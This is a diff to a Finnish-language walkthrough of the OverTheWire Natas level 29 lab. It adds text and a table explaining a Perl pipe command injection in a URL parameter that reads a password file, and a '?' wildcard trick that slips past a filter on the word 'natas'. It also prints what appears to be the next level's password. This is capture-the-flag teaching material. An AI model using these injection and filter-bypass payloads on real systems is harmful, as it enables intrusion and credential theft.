@@ -236,11 +236,19 @@ Tämä on virallinen ratkaisu: `http://natas29.natas.labs.overthewire.org/index.
 
 **natas30 : WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH**
 
+## ratkaisu osa - välivaihe 
+
 Yhdessä testissä: `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/natas_webpass/natas30%00` - koska tämä url parametri tässä on suodatusta estääksen sen siksi saastu vihje "meeeep"
 
-
 **miksi näin?**
-Otin **natas** - sanasta, että merkitsee/korvaa erikoismerkejä tai muulla tahansa mielikuvituksella just jokerimerkkiäyhdistelmällä niin näin saa se tuloksensa. Tässä harjoituksessa pitäis käyttää tätä: `etc/natas_webpass/natas30` - ja tästä muuttaa se perl underground ja käyttäen erikoismerkiä ja siksi vastaus on: `|cat%20/etc/n?tas_webpass/n?tas30%20%00`
+Otin **natas** - sanasta, että merkitsee/korvaa erikoismerkejä tai muulla tahansa mielikuvituksella just jokerimerkkiäyhdistelmällä niin näin saa se tuloksensa. Koska erikoismerkien ideana on **kiertää suodatusta**, vaikka palvelin suodattaa suoraan sanan “natas”. Se estää komennon ennen kuin shell pääsee käsittelemään sitä. Vaikka se olisi teknisesti oikein, suodatus torppaa sen. Siksi harjoituksessa kierettään vastauksena: `|cat /etc/n?tas_webpass/n?tas30`
+
+| Komento                                 | Toimiiko? | Selitys                                                  |
+|-----------------------------------------|-----------|-----------------------------------------------------------|
+| `cat /etc/natas_webpass/natas30`        | ❌ Ei      | Suodatus estää suoraan sanan “natas”                     |
+| `cat /etc/n?tas_webpass/n?tas30`        | ✅ Kyllä   | `?` toimii jokerimerkkinä ja kiertää suodatuksen         |
+
+Tässä harjoituksessa pitäis käyttää tätä: `etc/natas_webpass/natas30` - ja tästä muuttaa se perl underground ja käyttäen erikoismerkiä ja siksi vastaus on: `|cat%20/etc/n?tas_webpass/n?tas30%20%00`
 
 
 ![alt text](./kuvat-level29-34/natas29-12.png)
